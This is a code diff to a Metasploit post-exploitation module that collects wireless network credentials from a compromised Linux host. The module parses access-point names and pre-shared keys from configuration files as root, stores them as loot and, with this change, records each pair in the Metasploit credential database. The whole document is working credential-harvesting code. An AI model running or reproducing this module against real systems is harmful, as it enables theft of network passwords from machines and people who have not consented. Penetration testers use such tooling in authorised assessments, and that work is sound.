@@ -11,6 +11,8 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
 
+  include Msf::Auxiliary::Report
+
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'Linux Gather 802-11-Wireless Security Credentials',
@@ -38,9 +40,14 @@ class Metasploit3 < Msf::Post
     datastore['DIR']
   end
 
-  #
+  #def m_read_file(filename)
+  #  # read if the `filename` is readable
+  #  if cmd_exec("if [ -r #{filename} ];then 1;fi")
+  #    read_file(filename)
+  #  end
+  #end
+
   # Extracts AccessPoint name and PSK
-  #
   def get_psk(data, ap_name)
     data.each_line do |l|
       if l =~ /^psk=/
@@ -78,8 +85,7 @@ class Metasploit3 < Msf::Post
       if tbl.rows.empty?
         print_status('No PSK has been found!')
       else
-        print_line(tbl.to_s)
-
+        print_line("\n" + tbl.to_s)
         p = store_loot(
           'linux.psk.creds',
           'text/csv',
@@ -87,10 +93,24 @@ class Metasploit3 < Msf::Post
           tbl.to_csv,
           File.basename('wireless_credentials.txt')
         )
-        #tbl.rows.each do |cred|
-        #  report_auth_info()
-        #end
+
         print_good("Secrets stored in: #{p}")
+
+        tbl.rows.each do |cred|
+          user = cred[0] # AP name
+          password = cred[1]
+          create_credential(
+            workspace_id: myworkspace_id,
+            origin_type: :session,
+            address: session.session_host,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            username: user,
+            private_data: password,
+            private_type: :password,
+          )
+        end
+        print_status("Done")
       end
     else
       print_error('You must run this module as root!')
